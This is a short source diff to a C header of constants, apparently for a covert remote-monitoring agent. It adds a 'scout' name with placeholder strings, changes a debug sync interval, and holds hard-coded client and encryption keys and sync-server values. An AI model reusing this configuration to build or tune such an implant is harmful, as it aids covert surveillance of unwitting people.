@@ -11,6 +11,7 @@
 #define DEMO_TAG			"hxVtdxJ/Z8LvK3ULSnKRUmLE"
 #define WMARKER				"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
 #define SYNC_SERVER			"rcs-castore"
+#define SCOUT_NAME			"pippopippo"
 #else
 #define CLIENT_KEY			"ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ"
 #define ENCRYPTION_KEY		"WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg"
@@ -19,11 +20,12 @@
 #define DEMO_TAG			"Pg-WaVyPzMMMMmGbhP6qAigT"
 #define WMARKER				"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
 #define SYNC_SERVER			"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
+#define SCOUT_NAME			"SCOUTSCOUTSCOUTSCOUT"
 #endif
 
 
 #ifdef _DEBUG
-#define SYNC_INTERVAL		2000
+#define SYNC_INTERVAL		20000
 #define FIRST_WAIT			800
 #else
 #define SYNC_INTERVAL		1200000
